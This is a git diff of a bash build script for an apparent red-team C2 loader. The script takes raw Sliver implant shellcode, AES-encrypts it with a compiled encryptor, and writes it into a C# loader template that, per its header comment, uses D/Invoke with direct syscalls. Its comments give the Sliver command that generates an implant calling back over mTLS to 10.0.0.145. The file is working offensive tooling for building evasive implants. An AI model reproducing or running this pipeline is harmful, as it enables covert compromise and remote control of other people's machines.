@@ -1,6 +1,10 @@
 #!/bin/bash
 
-lhost="10.0.0.189"
+## Version 0.2, using D/Invoke with direct syscalls
+## Using sliver shellcode directly without donut 
+
+## lhost and lport are not in use for this script, make sure arch is correct
+lhost="10.0.0.145"
 lport="8888"
 arch="x64"
 c2type="sliver"
@@ -13,41 +17,31 @@ echo 'c2type:'$c2type
 mkdir tmp
 mkdir output
 
-### To Generate a Sliver implant without obfuscation:
-# [server] sliver > generate -N SliverNoObf --mtls 10.0.0.189 --skip-symbols --save /opt/
+### To Generate a Sliver implant shellcode without obfuscation:
+# [server] sliver > generate -N Sliver2 --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
 # [*] Generating new windows/amd64 implant binary
-# [*] Symbol obfuscation is enabled
-# [*] Build completed in 00:00:24
-# [*] Implant saved to /opt/slivernoobf.exe
+# [!] Symbol obfuscation is disabled
+# [*] Build completed in 00:01:25
+# [*] Implant saved to /root/Codes/c2loader/input/sliver2.bin
 #
-### Move the /opt/slivernoobf.exe to folder input and rename to Sliver.exe, then run the autogen script.
+### Move the sliver2.bin to folder input if required, then run the autogen script.
 
-rawscfilename='Sliver.bin'
+rawscfilename='sliver2.bin'
 rawscfilename_enc=$rawscfilename'.enc'
-raw_cs_filename_compiled='Sliver.exe'
 
-if [ $arch = 'x64' ]
-then
-    donut/donut -a 2 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
-fi
-
-if [ $arch = 'x86' ]
-then
-    donut/donut -a 1 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
-fi
 
 sleep 2
 
-cp aesloader_template.txt tmp/aesloadermono_sliver.cs
+cp aesloader2_template.txt tmp/aesloadermono_sliver.cs
 
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 
-mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt
+mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt
 
-encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
-encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
-aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
-aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)
+encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
+encpayloadlength=$(cat tmp/enc_output2.txt | grep 'PayloadLength' | cut -d ':' -f 2)
+aeskey=$(cat tmp/enc_output2.txt | grep 'AES_Key' | cut -d ':' -f 2)
+aesiv=$(cat tmp/enc_output2.txt | grep 'AES_IV' | cut -d ':' -f 2)
 
 if [ $arch = 'x64' ]
 then
